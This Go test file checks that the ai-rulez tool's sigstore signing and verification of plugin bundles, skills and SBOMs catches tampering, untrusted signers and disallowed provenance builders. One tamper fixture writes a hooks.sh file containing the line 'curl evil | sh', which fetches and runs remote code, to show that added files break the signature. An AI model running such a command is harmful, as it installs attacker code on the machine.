package commands

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sigstore/sigstore/pkg/cryptoutils"
	"github.com/sigstore/sigstore/pkg/signature/kms/fake"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Goldziher/ai-rulez/v5/internal/signing"
	"github.com/Goldziher/ai-rulez/v5/internal/signing/sigstore"
)

// artifactFixture is a project that trusts one key for bundles, skills and SBOMs,
// plus a bundle directory, a skill directory and an SBOM file outside it.
type artifactFixture struct {
	*signFixture
	bundle string
	skill  string
	sbom   string
}

const artifactTrustTable = "\n[signing]\nmax_age = \"30d\"\n" +
	"[[signing.trust]]\nsubject = \"bundle\"\nkey_file = \"keys/release.pub\"\n" +
	"[[signing.trust]]\nsubject = \"skill\"\nsource = \"shared\"\nkey_file = \"keys/release.pub\"\n" +
	"[[signing.trust]]\nsubject = \"sbom\"\nkey_file = \"keys/release.pub\"\n"

func newArtifactFixture(t *testing.T, table string) *artifactFixture {
	t.Helper()
	f := &artifactFixture{signFixture: newSignFixture(t, table)}
	out := t.TempDir()
	f.bundle = filepath.Join(out, "acme-plugin")
	writeFile(t, filepath.Join(f.bundle, "plugin.json"), `{"name":"acme"}`)
	writeFile(t, filepath.Join(f.bundle, "skills", "deploy", "SKILL.md"), "---\nname: deploy\n---\nShip it.\n")
	f.skill = filepath.Join(out, "deploy")
	writeFile(t, filepath.Join(f.skill, "SKILL.md"), "---\nname: deploy\ndescription: Deploy\n---\nShip it.\n")
	f.sbom = filepath.Join(out, "sbom.cdx.json")
	writeFile(t, f.sbom, `{"bomFormat":"CycloneDX"}`)
	return f
}

func (f *artifactFixture) signWith(t *testing.T, key string, set func()) int {
	t.Helper()
	signKey = key
	set()
	defer func() {
		signKey, signBundle, signSkill, signSBOM, signProvenance, signAppend, signOutput = "", "", "", "", false, false, ""
	}()
	var code int
	capture(t, func() { code = codeOf(runSign(context.Background(), nil)) })
	return code
}

func (f *artifactFixture) verifyWith(t *testing.T, set func()) (code int, stdout, stderr string) {
	t.Helper()
	verifyFormat = ""
	set()
	defer func() {
		verifyAttestation, verifyBundleDir, verifySkillDir, verifySBOMFile, verifySource, verifyRequireProvenance, verifyFormat = false, "", "", "", "", false, ""
	}()
	stdout, stderr = capture(t, func() { code = runVerifyAttestation(nil, os.Stdout) })
	return code, stdout, stderr
}

func TestSignAndVerifyBundleWithProvenance(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle, signProvenance, signBuilderID = f.bundle, true, "https://ci.example.org/builder" }))
	for _, name := range []string{signing.SidecarName, signing.ProvenanceSidecarName} {
		info, err := os.Stat(filepath.Join(f.bundle, name))
		require.NoError(t, err, name)
		assertFileMode(t, info, 0o644, "attestations are public")
	}

	code, stdout, _ := f.verifyWith(t, func() { verifyBundleDir, verifyRequireProvenance = f.bundle, true })

	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "OK  bundle  signer=sha256:")
	assert.Contains(t, stdout, "digest=sha256:")
	assert.Contains(t, stdout, "provenance builder=https://ci.example.org/builder")
	assert.NotContains(t, stdout, "hash_version", "a bundle has no lock hash scheme")
}

func TestVerifyBundleJSONMatchesTheSchema(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle, signProvenance = f.bundle, true }))

	code, stdout, _ := f.verifyWith(t, func() { verifyBundleDir, verifyFormat = f.bundle, formatJSON })

	require.Equal(t, 0, code)
	validateAgainst(t, "../../schema/verify-attestation.schema.json", []byte(stdout))
	var doc attestationReport
	require.NoError(t, json.Unmarshal([]byte(stdout), &doc))
	require.Len(t, doc.Results, 1)
	r := doc.Results[0]
	assert.Equal(t, "bundle", r.Subject)
	assert.Regexp(t, `^sha256:[0-9a-f]{64}$`, r.Digest)
	require.NotNil(t, r.Provenance, "a provenance file next to the bundle is verified even when not required")
	assert.Equal(t, signing.DefaultBuilderID, r.Provenance.Builder)
}

func TestSignBundleProvenanceNamesTheGitHubWorkflowAsBuilder(t *testing.T) {
	tests := []struct {
		name   string
		server string
		want   string
	}{
		{"github.com", "", "https://github.com/acme/tools/.github/workflows/release.yaml@refs/tags/v1.2.0"},
		{"enterprise server", "https://ghe.example.org/", "https://ghe.example.org/acme/tools/.github/workflows/release.yaml@refs/tags/v1.2.0"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Arrange: the variables a GitHub Actions run sets, on purpose.
			f := newArtifactFixture(t, artifactTrustTable)
			t.Setenv("GITHUB_WORKFLOW_REF", "acme/tools/.github/workflows/release.yaml@refs/tags/v1.2.0")
			if tt.server != "" {
				t.Setenv("GITHUB_SERVER_URL", tt.server)
			}

			// Act
			require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle, signProvenance = f.bundle, true }))
			code, stdout, _ := f.verifyWith(t, func() { verifyBundleDir, verifyFormat = f.bundle, formatJSON })

			// Assert
			require.Equal(t, 0, code)
			var doc attestationReport
			require.NoError(t, json.Unmarshal([]byte(stdout), &doc))
			require.Len(t, doc.Results, 1)
			require.NotNil(t, doc.Results[0].Provenance)
			assert.Equal(t, tt.want, doc.Results[0].Provenance.Builder)
		})
	}
}

func TestVerifyBundleFailures(t *testing.T) {
	tests := []struct {
		name       string
		extraTable string
		prepare    func(t *testing.T, f *artifactFixture)
		set        func(f *artifactFixture)
		wantCode   string
	}{
		{"unsigned", "", func(*testing.T, *artifactFixture) {}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR720"},
		{"file changed after signing", "", func(t *testing.T, f *artifactFixture) {
			require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle = f.bundle }))
			writeFile(t, filepath.Join(f.bundle, "plugin.json"), `{"name":"evil"}`)
		}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR724"},
		{"file added after signing", "", func(t *testing.T, f *artifactFixture) {
			require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle = f.bundle }))
			writeFile(t, filepath.Join(f.bundle, "hooks.sh"), "curl evil | sh")
		}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR724"},
		{"signer not trusted", "", func(t *testing.T, f *artifactFixture) {
			other, _, err := sigstore.GenerateKeyPair(nil)
			require.NoError(t, err)
			otherPath := filepath.Join(t.TempDir(), "other.key")
			require.NoError(t, os.WriteFile(otherPath, other, 0o600))
			require.Equal(t, 0, f.signWith(t, otherPath, func() { signBundle = f.bundle }))
		}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR722"},
		{"provenance required and missing", "", func(t *testing.T, f *artifactFixture) {
			require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle = f.bundle }))
		}, func(f *artifactFixture) { verifyBundleDir, verifyRequireProvenance = f.bundle, true }, "AR729"},
		{"provenance builder not allowed", "builders = [\"https://ci.example.org/builder\"]\n", func(t *testing.T, f *artifactFixture) {
			require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle, signProvenance, signBuilderID = f.bundle, true, "https://evil.example/builder" }))
		}, func(f *artifactFixture) { verifyBundleDir = f.bundle }, "AR729"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := newArtifactFixture(t, strings.Replace(artifactTrustTable, "[signing]\n", "[signing]\n"+tt.extraTable, 1))
			tt.prepare(t, f)

			code, _, stderr := f.verifyWith(t, func() { tt.set(f) })

			assert.Equal(t, exitDrift, code, stderr)
			assert.Contains(t, stderr, tt.wantCode)
		})
	}
}

func TestSignAndVerifySBOM(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	require.Equal(t, 0, f.signWith(t, f.privKey, func() { signSBOM = f.sbom }))
	_, err := os.Stat(f.sbom + ".sigstore.json")
	require.NoError(t, err)

	code, stdout, _ := f.verifyWith(t, func() { verifySBOMFile = f.sbom })
	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "OK  sbom")

	writeFile(t, f.sbom, `{"bomFormat":"CycloneDX","tampered":true}`)
	code, _, stderr := f.verifyWith(t, func() { verifySBOMFile = f.sbom })
	assert.Equal(t, exitDrift, code)
	assert.Contains(t, stderr, "AR724")
}

func TestSignAndVerifySkillScopedBySource(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	require.Equal(t, 0, f.signWith(t, f.privKey, func() { signSkill = f.skill }))

	code, stdout, _ := f.verifyWith(t, func() { verifySkillDir, verifySource = f.skill, "shared" })
	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "OK  skill")

	code, _, stderr := f.verifyWith(t, func() { verifySkillDir, verifySource = f.skill, "other" })
	assert.Equal(t, exitDrift, code, "a publisher trusted for one source cannot vouch for another")
	assert.Contains(t, stderr, "AR722")
}

func TestSignAppendMeetsAThreshold(t *testing.T) {
	f := newSignFixture(t, "")
	second, secondPub, err := sigstore.GenerateKeyPair(nil)
	require.NoError(t, err)
	secondKey := filepath.Join(t.TempDir(), "second.key")
	require.NoError(t, os.WriteFile(secondKey, second, 0o600))
	require.NoError(t, os.WriteFile(filepath.Join(f.root, "keys", "second.pub"), secondPub, 0o644))
	writeFile(t, filepath.Join(f.root, ".ai-rulez", "config.toml"), lockProjectConfig+
		"\n[signing]\n[signing.thresholds]\nlock = 2\n[[signing.trust]]\nkey_file = \"keys/release.pub\"\n[[signing.trust]]\nkey_file = \"keys/second.pub\"\n")
	require.Equal(t, 0, writeLockAt("", "", nil))
	af := &artifactFixture{signFixture: f}

	require.Equal(t, 0, f.sign(t))
	code, _, stderr := f.verify(t, "")
	assert.Equal(t, exitDrift, code)
	assert.Contains(t, stderr, "AR728", "one signature does not meet a threshold of two")

	signLock = true
	require.Equal(t, 0, af.signWith(t, secondKey, func() { signLock, signAppend = true, true }))
	_, err = os.Stat(filepath.Join(f.root, ".ai-rulez", "ai-rulez.lock.2.sigstore.json"))
	require.NoError(t, err, "--append writes a numbered co-signature file")
	code, stdout, _ := f.verify(t, "")

	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "2 signers")

	require.NoError(t, os.Remove(f.bundle()))
	code, _, stderr = f.verify(t, "")
	assert.Equal(t, exitDrift, code)
	assert.Contains(t, stderr, "AR728", "a co-signature alone does not stand in for the primary")
}

func TestSignAppendNeedsAnExistingAttestation(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)

	code := f.signWith(t, f.privKey, func() { signBundle, signAppend = f.bundle, true })

	assert.Equal(t, 1, code)
}

func TestVerifyBundleWithoutAProjectUsesTheFlagKey(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	require.Equal(t, 0, f.signWith(t, f.privKey, func() { signBundle = f.bundle }))
	chdir(t, t.TempDir()) // a consumer's directory: no ai-rulez project

	code, _, stderr := f.verifyWith(t, func() { verifyBundleDir = f.bundle })
	assert.Equal(t, 1, code, "no project and no named signer cannot verify")
	assert.Contains(t, stderr, "config")

	code, stdout, _ := f.verifyWith(t, func() { verifyBundleDir, verifyPublicKeys, verifyNoState = f.bundle, []string{f.pubKey}, true })
	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "OK  bundle")
}

func TestVerifyArtifactFlagValidation(t *testing.T) {
	f := newArtifactFixture(t, artifactTrustTable)
	tests := []struct {
		name string
		set  func()
		want string
	}{
		{"two subjects", func() { verifyBundleDir, verifySBOMFile = f.bundle, f.sbom }, "mutually exclusive"},
		{"provenance for an sbom", func() { verifySBOMFile, verifyRequireProvenance = f.sbom, true }, "--require-provenance applies to --bundle"},
		{"source for a bundle", func() { verifyBundleDir, verifySource = f.bundle, "shared" }, "--source applies to --skill"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			code, _, stderr := f.verifyWith(t, tt.set)

			assert.Equal(t, 1, code)
			assert.Contains(t, stderr, tt.want)
		})
	}
}

func TestSignWithAKMSKeyAndExportItsPublicKey(t *testing.T) {
	f := newArtifactFixture(t, "\n[signing]\n[[signing.trust]]\nsubject = \"bundle\"\nkey_file = \"keys/kms.pub\"\n")
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)
	ctx := context.WithValue(context.Background(), fake.KmsCtxKey{}, priv)
	pubOut := filepath.Join(f.root, "keys", "kms.pub")
	signKey, signBundle, signPublicOut = "fakekms://release", f.bundle, pubOut
	t.Cleanup(func() { signKey, signBundle, signPublicOut = "", "", "" })

	var code int
	capture(t, func() { code = codeOf(runSign(ctx, nil)) })

	require.Equal(t, 0, code)
	exported, err := os.ReadFile(pubOut)
	require.NoError(t, err)
	want, err := cryptoutils.MarshalPublicKeyToPEM(priv.Public())
	require.NoError(t, err)
	assert.Equal(t, string(want), string(exported), "the exported key is the KMS key's public half")
	code, stdout, _ := f.verifyWith(t, func() { verifyBundleDir = f.bundle })
	assert.Equal(t, 0, code)
	assert.Contains(t, stdout, "OK  bundle")
}
